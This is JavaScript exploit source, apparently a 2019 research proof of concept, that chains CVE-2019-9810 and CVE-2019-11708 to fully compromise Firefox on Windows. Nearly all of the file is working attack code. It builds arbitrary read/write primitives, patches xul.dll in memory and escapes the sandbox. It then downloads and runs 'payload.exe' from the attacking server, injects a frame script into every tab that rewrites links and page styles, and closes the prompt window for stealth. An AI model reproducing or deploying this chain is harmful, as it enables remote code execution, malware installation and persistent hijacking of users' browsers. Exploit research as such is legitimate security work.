// Axel '0vercl0k' Souchet - November 19 2019

// 0:000> ? xul!sAutomationPrefIsSet - xul
// Evaluate expression: 85724947 = 00000000`051c0f13
const XulsAutomationPrefIsSet = 0x051c0f13n;
// 0:000> ? xul!disabledForTest - xul
// Evaluate expression: 85400792 = 00000000`05171cd8
const XuldisabledForTest = 0x05171cd8n;

const Debug = false;
const dbg = p => {
    if(Debug == false) {
        return;
    }

    print(`Debug: ${p}`);
};

const ArraySize = 0x5;
const WantedArraySize = 0x42424242;

let arr = null;
let Trigger = false;
const Spray = [];

function f(Special, Idx, Value) {
    arr[Idx] = 0x41414141;
    Special.slice();
    arr[Idx] = Value;
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if(!Trigger) {
                return;
            }

            arr.length = 0;
            for(let i = 0; i < 0x40000; i++) {
                Spray.push(new Uint32Array(ArraySize));
            }
        };
    }
};

function GetMeBiggie() {
    for(let Idx = 0; Idx < 0x100000; Idx++) {
        Spray.push(new Uint32Array(ArraySize));
    }

    const SpecialSnowFlake = new SoSpecial();
    for(let Idx = 0; Idx < 10; Idx++) {
        arr = new Array(0x7e);
        Trigger = false;
        for(let Idx = 0; Idx < 0x400; Idx++) {
            f(SpecialSnowFlake, 0x70, Idx);
        }

        Trigger = true;
        f(SpecialSnowFlake, 47, WantedArraySize);
        if(arr.length != 0) {
            continue;
        }

        const Biggie = Spray.find(e => e.length != ArraySize);
        if(Biggie != null) {
            return Biggie;
        }
    }

    return null;
}

function ExploitCVE_2019_9810() {
    print = console.log;

    const Biggie = GetMeBiggie();
    if(Biggie == null || Biggie.length != WantedArraySize) {
        dbg('Failed to set things up :(.');
        return false;
    }

    //
    // Scan for one of the Uint32Array we sprayed earlier.
    //

    let Biggie2AdjacentSize = null;
    const JSValueArraySize = 0xfffa000000000000n | BigInt(ArraySize);
    for(let Idx = 0; Idx < 0x100; Idx++) {
        const Qword = BigInt(Biggie[Idx]) << 32n | BigInt(Biggie[Idx + 1]);
        if(Qword == JSValueArraySize) {
            Biggie2AdjacentSize = Idx + 1;
            break;
        }
    }

    if(Biggie2AdjacentSize == null) {
        dbg('Failed to find an adjacent array :(.');
        return false;
    }

    //
    // Use the array length as a marker.
    //

    const AdjacentArraySize = 0xbbccdd;
    Biggie[Biggie2AdjacentSize] = AdjacentArraySize;

    //
    // Find the array now..
    //

    const AdjacentArray = Spray.find(
        e => e.length == AdjacentArraySize
    );

    if(AdjacentArray == null) {
        dbg('Failed to find the corrupted adjacent array :(.');
        return false;
    }

    const ReadPtr = Addr => {
        const SizeInDwords = 2;
        const SavedSlot = [
            Biggie[Biggie2AdjacentSize],
            Biggie[Biggie2AdjacentSize + 2 + 2],
            Biggie[Biggie2AdjacentSize + 2 + 2 + 1]
        ];

        //
        // Corrupt the `AdjacentArray`'s size / data slot.
        //

        Biggie[Biggie2AdjacentSize] = SizeInDwords;
        Biggie[Biggie2AdjacentSize + 2 + 2] = Number(Addr & 0xffffffffn);
        Biggie[Biggie2AdjacentSize + 2 + 2 + 1] = Number(Addr >> 32n);

        //
        // Read arbitrary location now.
        //

        const Ptr = BigInt.fromUint32s([AdjacentArray[0], AdjacentArray[1]]);

        //
        // Restore the `AdjacentArray`'s size / data slot.
        //

        Biggie[Biggie2AdjacentSize] = SavedSlot[0];
        Biggie[Biggie2AdjacentSize + 2 + 2] = SavedSlot[1];
        Biggie[Biggie2AdjacentSize + 2 + 2 + 1] = SavedSlot[2];
        return Ptr;
    };

    const WritePtr = (Addr, Value) => {
        const SizeInDwords = 2;
        const SavedSlot = [
            Biggie[Biggie2AdjacentSize],
            Biggie[Biggie2AdjacentSize + 2 + 2],
            Biggie[Biggie2AdjacentSize + 2 + 2 + 1]
        ];

        //
        // Corrupt the `AdjacentArray`'s size / data slot.
        //

        Biggie[Biggie2AdjacentSize] = SizeInDwords;
        Biggie[Biggie2AdjacentSize + 2 + 2] = Number(Addr & 0xffffffffn);
        Biggie[Biggie2AdjacentSize + 2 + 2 + 1] = Number(Addr >> 32n);

        //
        // Write to arbitrary location now.
        //

        AdjacentArray[0] = Number(Value & 0xffffffffn);
        AdjacentArray[1] = Number(Value >> 32n);

        //
        // Restore the `AdjacentArray`'s size / data slot.
        //

        Biggie[Biggie2AdjacentSize] = SavedSlot[0];
        Biggie[Biggie2AdjacentSize + 2 + 2] = SavedSlot[1];
        Biggie[Biggie2AdjacentSize + 2 + 2 + 1] = SavedSlot[2];
        return true;
    };

    const AddrOf = Obj => {
        AdjacentArray.hell_on_earth = Obj;
        // 0:000> dqs 1ae5716e76a0
        // 00001ae5`716e76a0  00001ae5`7167dfd0
        // 00001ae5`716e76a8  000010c5`8e73c6a0
        // 00001ae5`716e76b0  00000238`9334e790
        // 00001ae5`716e76b8  00007ff6`6be55010 js!emptyElementsHeader+0x10
        // 00001ae5`716e76c0  fffa0000`00000000
        // 00001ae5`716e76c8  fff88000`00bbccdd
        // 0:000> !telescope 0x00002389334e790
        // 0x000002389334e790|+0x0000: 0xfffe1ae5716e7640 (Unknown)
        const SlotOffset = Biggie2AdjacentSize - (3 * 2);
        const SlotsAddress = BigInt.fromUint32s(
            Biggie.slice(SlotOffset, SlotOffset + 2)
        );

        return BigInt.fromJSValue(ReadPtr(SlotsAddress));
    };

    //
    // Let's move the battle field to the TenuredHeap
    //

    const ArrayBufferLength = 10;
    const AB1 = new ArrayBuffer(ArrayBufferLength);
    const AB2 = new ArrayBuffer(ArrayBufferLength);
    const AB1Address = AddrOf(AB1);
    const AB2Address = AddrOf(AB2);

    dbg(`AddrOf(AB1): ${AB1Address.toString(16)}`);
    dbg(`AddrOf(AB2): ${AB2Address.toString(16)}`);
    WritePtr(AB1Address + 0x28n, 0xfff8800000010000n);
    WritePtr(AB2Address + 0x28n, 0xfff8800000010000n);

    if(AB1.byteLength != AB2.byteLength && AB1.byteLength != 0x10000) {
        dbg('Corrupting the ArrayBuffers failed :(.');
        return false;
    }

    const Primitives = BuildPrimitives(AB1, AB2);
    Math.atan2(AB2);

    //
    // All right, time to clean up behind ourselves.
    // Let's fix AdjacentArray's size first (as we are using Biggie to do it).
    //

    Biggie[Biggie2AdjacentSize] = ArraySize;

    //
    // Let's fix Biggie's length as we are done with it.
    // 0:000> !smdump_jsvalue 0xfffe11e6fa2f7580
    // Detected xul.dll, using it as js module.
    // 11e6fa2f7580: js!js::TypedArrayObject:       Type: Uint32Array
    // 11e6fa2f7580: js!js::TypedArrayObject:     Length: 1337
    // 11e6fa2f7580: js!js::TypedArrayObject: ByteLength: 5348
    // 11e6fa2f7580: js!js::TypedArrayObject: ByteOffset: 0
    // 11e6fa2f7580: js!js::TypedArrayObject:    Content: Uint32Array({Length:1337, ...})
    // @$smdump_jsvalue(0xfffe11e6fa2f7580)
    //
    // 0:000> !telescope 0x11e6fa2f7580
    // 0x000011e6fa2f7580|+0x0000: 0x000006a0415c37f0 (Unknown) -> 0x00007ff93e106830 (xul.dll (.rdata)) -> 0x00007ff93e2f66ce (xul.dll (.rdata)) -> 0x00007ff93e2f66ce (Ascii(Uint32Array))
    // 0x000011e6fa2f7588|+0x0008: 0x000006a041564100 (Unknown) -> 0x000006a041583cc0 (Unknown) -> 0x00007ff93e106830 (xul.dll (.rdata)) -> 0x00007ff93e2f66ce (xul.dll (.rdata)) -> 0x00007ff93e2f66ce (Ascii(Uint32Array))
    // 0x000011e6fa2f7590|+0x0010: 0x0000000000000000 (Unknown)
    // 0x000011e6fa2f7598|+0x0018: 0x00007ff93e0f41d8 (xul.dll (.rdata)) -> 0xfff9800000000000 (Unknown)
    // 0x000011e6fa2f75a0|+0x0020: 0xfffe11e6fa2f70c0 (Unknown)
    // 0x000011e6fa2f75a8|+0x0028: 0xfff8800000000539 (Unknown)
    //

    const BiggieLengthAddress = Primitives.AddrOf(Biggie) + 0x28n;
    Primitives.WritePtr(BiggieLengthAddress, 0xfff8800000000000n | BigInt(ArraySize));

    //
    // From there, we're kinda done - let's get god mode and fuck off.
    //

    GodMode(AB1, AB2, Primitives, XulsAutomationPrefIsSet, XuldisabledForTest);
    return true;
}

//
// This function uses a `Sandbox` with a `System Principal` to be able to grab the
// `docShell` object off the `window` object. Once it has it, it can grab the frame
// `messageManager` that we need to trigger the sandbox escape.
//

function GetContentFrameMessageManager(Win) {
    function _GetDocShellFromWindow(Win) {
        return Win.docShell;
    }

    const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
    const Cu = Components.utils;
    const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());
    const Code = _GetDocShellFromWindow.toSource();
    Cu.evalInSandbox(Code, Sbx);
    const DocShell = Sbx._GetDocShellFromWindow(Win);
    Cu.nukeSandbox(Sbx);
    return DocShell.messageManager;
}

//
// This function sends a 'Prompt:Open' message over the frame message manager IPC,
// with an URI.
//

function PromptOpen(Uri) {
    const FrameMM = GetContentFrameMessageManager(window);
    const Result = FrameMM.sendSyncMessage('Prompt:Open', { uri: Uri });
    return Result;
}

//
// This is the function that abuses the `Prompt:Open` message to re-exploit the parent
// process and escape the sandbox.
//

function TriggerCVE_2019_11708() {
    PromptOpen(`${location.origin}?stage3`);
}

//
// This is the function that gets written into the frame script the exploit drops
// on disk. A trick to debug this code is to pop-up a `Browser Toolbox` as well as a
// `Browser Content toolbox` and execute the following in the `Browser Toolbox`:
//   Services.mm.loadFrameScript('file://frame-script.js', true)
// This should break in the `Browser Content Toolbox` debugger window.
//

function FrameScriptPayload() {
    function PimpMyDocument() {

        //
        // Don't infect doar-e and leave Cthulhu alone...
        //

        if(content.document.location.origin == 'https://doar-e.github.io' ||
           content.document.location.origin == 'http://localhost:8000') {
            return;
        }

        //
        // .. as well as don't play with non http origins (I've seen empty/null origins).
        //

        if(!content.document.location.origin.startsWith('http')) {
            return;
        }

        //
        // Time to party! Let's find every `A` tag and make them point to doar-e.
        // We also use this opportunity to make every `backgroundImage` / `backgroundColor`
        // style attributes to `none` / `transparent` to not hide the doar-e background.
        //

        for(const Node of content.document.getElementsByTagName('*')) {
            if(Node.tagName == 'A') {
                Node.href = 'https://doar-e.github.io/';
                continue;
            }

            Node.style.backgroundImage = 'none';
            Node.style.backgroundColor = 'transparent';
        }

        //
        // Change the background.
        //

        content.document.body.style.backgroundImage = 'url(https://doar-e.github.io/images/themes03_light.gif)';
    }

    //
    // First we set an event handler to make sure to be invoked when a new `content`
    // is created. Keep in mind that we basically have ~three cases to handle:
    //  1/ We are getting injected in an already existing tab,
    //  2/ We are getting injected in a new tab,
    //  3/ A user clicks on a link and a new `content` gets created.
    // We basically want to have control over those three events. The below ensures
    // we get a chance to execute code for 2/.
    //

    addEventListener('DOMWindowCreated', FrameScriptPayload);
    dump(`Hello from: ${content.location.origin}\n`);

    if(content.document != null && content.document.body != null) {

        //
        // Either the tab already existed in which case we already have a document which we
        // can play with...
        //

        PimpMyDocument();
        return;
    }

    //
    // ..Or it doesn't exist quite yet and we want to get a callback when it does.
    //

    content.addEventListener('load', PimpMyDocument);
}

//
// This function drops a file (open + write + close) using the OSFile JS module.
//

function DropFile(Path, Content) {

    //
    // We expect either a string or a TypedArray.
    //

    const Encoder = new TextEncoder();
    const ContentBuffer = (typeof Content == 'string') ? Encoder.encode(Content) : Content;
    return OS.File.open(Path, {write: true, truncate: true})
    .then(File => {
        return Promise.all([
            // We return the File object in order to be able to use it in the
            // next `.then`. This allows us to chain the `write` and the `close`
            // without another level of deepness.
            File,
            File.write(ContentBuffer),
        ]);
    })
    .then((Results) => {
        const [File, _WrittenBytes] = Results;
        return File.close();
    });
}

//
// This function drops / executes a payload binary, as well as inject a frame script
// into every tabs.
//

function Payload() {

    //
    // Import a bunch of JS modules we will be using later.
    //

    const { OS } = Components.utils.import('resource://gre/modules/osfile.jsm');
    const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');

    //
    // First order of business, we create a first promise that downloads the payload
    // (aka Slime Shady), drops it in the profile directory and finally executes it.
    //

    const Dir = OS.Constants.Path.localProfileDir;
    const PayloadPath = OS.Path.join(Dir, 'slimeshady.exe');
    const PayloadPromise = fetch(`${location.origin}/payload/bin/payload.exe`)
    .then((Response) => {

        //
        // We return the result as a TypedArray as this is what `DropFile`
        // expects for binary content.
        //

        return Response.arrayBuffer();
    })
    .then((Content) => {

        //
        // Time to drop the file now. Note that we return the promise so
        // the next `then` executes when the file has been successfully dropped.
        //

        dbg(`Payload downloaded.`);
        return DropFile(PayloadPath, new Uint8Array(Content));
    })
    .then(() => {

        //
        // At this point, we are ready to spawn the payload, let's do it!
        //

        dbg(`Creating the process.. ${PayloadPath}`);
        CreateProcessA(PayloadPath);
    })
    .catch(Ex => {
        console.log(`Exception in payload promise: ${Ex}`);
    });

    //
    // Second order of business is to backdoor the tabs. To do so, we drop a frame
    // script that we inject into every tabs.
    //

    const FramePayloadContent = `${FrameScriptPayload.toSource()}

FrameScriptPayload();`;
    const ScriptPath = OS.Path.join(Dir, 'frame-script.js');
    const FramePayloadPromise = DropFile(ScriptPath, FramePayloadContent)
    .then(() => {

        //
        // At this time we are ready to inject the frame script into the tabs.
        // Note that we need to drop the file locally / use the file:// scheme
        // so that the tabs accept to interpret the file (unfortunately,
        // remote ones are ignored).
        //

        dbg(`About to loadFrameScript: ${ScriptPath}`);
        Services.mm.loadFrameScript(`file://${ScriptPath}`, true);
    })
    .catch(Ex => {
        console.log(`Exception in frame payload promise: ${Ex}`);
    });


    //
    // Last but not least, we set up code to execute on completion of both the above
    // promises. You have to remember that at this point the modal window is still open
    // and blocks navigation / UI interaction, so we need to close it as soon as we can
    // to be as stealth as possible.
    // Just for kicks, we spawn a calculator when we're done because why not.
    //

    Promise.all([PayloadPromise, FramePayloadPromise])
    .then(() => {

        //
        // .. just for kicks.
        //

        CreateProcessA('c:\\windows\\system32\\calc.exe');

        //
        // Phew, we made it here let's close the window :).
        //

        window.close();
    })
    .catch(Ex => {
        console.log(`Exception in clean up promise: ${Ex}`);
        window.close();
    });
}

//
// This function patches the inlined portion of xpc::AreNonLocalConnectionsDisabled()
// in xul!mozilla::net::nsSocketTransport::InitiateSocket to avoid an assert when we have
// god mode. It's far from being the cleanest way, but this is the easiest way I found.
//
//   nsresult nsSocketTransport::InitiateSocket() {
//       SOCKET_LOG(("nsSocketTransport::InitiateSocket [this=%p]\n", this));
//       nsresult rv;
//       bool isLocal;
//       IsLocal(&isLocal);
//       if (gIOService->IsNetTearingDown()) {
//         return NS_ERROR_ABORT;
//       }
//       if (gIOService->IsOffline()) {
//         if (!isLocal) return NS_ERROR_OFFLINE;
//       } else if (!isLocal) {
//         if (NS_SUCCEEDED(mCondition) && xpc::AreNonLocalConnectionsDisabled() &&
//             !(IsIPAddrAny(&mNetAddr) || IsIPAddrLocal(&mNetAddr))) {
//           nsAutoCString ipaddr;
//           RefPtr<nsNetAddr> netaddr = new nsNetAddr(&mNetAddr);
//           netaddr->GetAddress(ipaddr);
//           fprintf_stderr(
//               stderr,
//               "FATAL ERROR: Non-local network connections are disabled and a "
//               "connection "
//               "attempt to %s (%s) was made.\nYou should only access hostnames "
//               "available via the test networking proxy (if running mochitests) "
//               "or from a test-specific httpd.js server (if running xpcshell "
//               "tests). "
//               "Browser services should be disabled or redirected to a local "
//               "server.\n",
//               mHost.get(), ipaddr.get());
//           MOZ_CRASH("Attempting to connect to non-local address!");
//         }
//       }
//

function PatchInitiateSocket() {

    //
    // Let's patch xul!mozilla::net::nsSocketTransport::InitiateSocket
    // so that it doesn't assert on us because we turned on testing features.
    // This is the assert we hit without the patch:
    //
    //   FATAL ERROR: Non-local network connections are disabled and a connection attempt to google.com (172.217.14.206) was made.
    //   You should only access hostnames available via the test networking proxy
    //   (if running mochitests) or from a test-specific httpd.js server (if running
    //   xpcshell tests). Browser services should be disabled or redirected to a local
    //   server.
    //   (4014.82c): Break instruction exception - code 80000003 (first chance)
    //   xul!mozilla::net::nsSocketTransport::InitiateSocket+0xe92:
    //   00007ff9`69a66372 cc              int     3
    //
    // Here is the disasembly before:
    //
    //   0:062> u xul!mozilla::net::nsSocketTransport::InitiateSocket+0xe6
    //   xul!mozilla::net::nsSocketTransport::InitiateSocket+0xe6 [c:\mozilla-central\netwerk\base\nsSocketTransport2.cpp @ 1264]:
    //   00007ff9`3f9c55c6 8b0d0cc7ff04    mov     ecx,dword ptr [xul!disabledForTest (00007ff9`449c1cd8)]
    //   00007ff9`3f9c55cc 83f9ff          cmp     ecx,0FFFFFFFFh
    //   00007ff9`3f9c55cf 7520            jne     xul!mozilla::net::nsSocketTransport::InitiateSocket+0x111 (00007ff9`3f9c55f1)
    //   00007ff9`3f9c55d1 488d0ddaa3df04  lea     rcx,[xul!`string' (00007ff9`447bf9b2)]
    //
    // And after:
    //
    //   0:068> u xul!mozilla::net::nsSocketTransport::InitiateSocket+0xe6
    //   xul!mozilla::net::nsSocketTransport::InitiateSocket+0xe6 [c:\mozilla-central\netwerk\base\nsSocketTransport2.cpp @ 1264]:
    //   00007ff9`3f9c55c6 90              nop
    //   00007ff9`3f9c55c7 90              nop
    //   00007ff9`3f9c55c8 90              nop
    //   00007ff9`3f9c55c9 4831c9          xor     rcx,rcx
    //   00007ff9`3f9c55cc 83f9ff          cmp     ecx,0FFFFFFFFh
    //   00007ff9`3f9c55cf 7520            jne     xul!mozilla::net::nsSocketTransport::InitiateSocket+0x111 (00007ff9`3f9c55f1)
    //
    // 0:051> ? xul!mozilla::net::nsSocketTransport::InitiateSocket+0xe6 - xul
    // Evaluate expression: 1529286 = 00000000`001755c6
    //

    const PatchOffset = 0x001755c6n;
    const XulBase = BigInt(GetModuleHandleA('xul.dll').toString());
    const PatchAddress = XulBase + PatchOffset;
    const PatchContent = [0x90, 0x90, 0x90, 0x48, 0x31, 0xc9];
    PatchCode(PatchAddress, PatchContent);
}

function Main(Route) {

    //
    // One way to tell if we were successful with our data corruption is by checking
    // if we have access to the PrivilegeManager. If we do, it means we are running
    // with a privileged context, if not we don't.
    //

    const RunningFromPrivilegedJS = window.netscape.security.PrivilegeManager != undefined;
    if(Route == '?stage1') {

        //
        // If we are asked to run stage1 with access to a privileged context, we skip
        // it and move on to stage2.
        //

        if(RunningFromPrivilegedJS) {
            return Main('?stage2');
        }

        //
        // Stage1 exploits CVE-2019-9810 and performs a data corruption attack to access
        // a privileged JS context.
        //

        if(!ExploitCVE_2019_9810()) {
            console.log('Failed :(');
            return;
        }

        //
        // Once we are done with the data corruption, we refresh the page to get access
        // to the privileged JS context. Moving on to stage2 \o/.
        //

        location.replace(`${location.origin}/?stage2`);
    }

    if(Route == '?stage2') {

        //
        // At this point we expect to have access to a privileged JS context.
        // If we don't it's probably bad news, so we'll just bail.
        //

        if(!RunningFromPrivilegedJS) {
            alert('problem');
            return;
        }

        //
        // Turn on privileges so that we can access the `Components` object.
        //

        window.netscape.security.PrivilegeManager.enablePrivilege('doar-e');


        //
        // Before going further, let's fix xul!mozilla::net::nsSocketTransport::InitiateSocket
        // to avoid the Firefox being unhappy.
        //

        PatchInitiateSocket()

        //
        // Now that we have access to the privileged context, we are also able to talk
        // over the frame message manager IPC and trigger CVE-2019-11708 to escape the
        // exploit the parent process.
        //

        TriggerCVE_2019_11708();
    }

    if(Route == '?stage3') {

        //
        // We should now be running in the broker which means we can exploit CVE-2019-9810
        // to perform the same attack than in stage1 but this time in the parent process.
        //

        if(!ExploitCVE_2019_9810()) {
            console.log('Elevation failed, closing the window.');
            window.close();
        }

        //
        // If we are successful it means that by refreshing the page, we should have
        // access to the privileged JS context from the parent process.
        // This basically means full compromise and we move on to backdooring the tabs,
        // as well as dropping the payload.
        //

        location.replace(`${location.origin}/?final`);
    }

    if(Route == '?final') {

        //
        // All right, we start of by turning on privileges so that we can access `Components`
        // & cie.
        //

        window.netscape.security.PrivilegeManager.enablePrivilege('doar-e');

        //
        // Before going further, let's fix xul!mozilla::net::nsSocketTransport::InitiateSocket
        // to avoid the Firefox being unhappy.
        //

        PatchInitiateSocket()

        //
        // We've worked hard to get here and it's time to drop the goodies :).
        //

        Payload();
    }
}

function Onload() {
    if(location.search != '') {
        Main(location.search);
    }
}
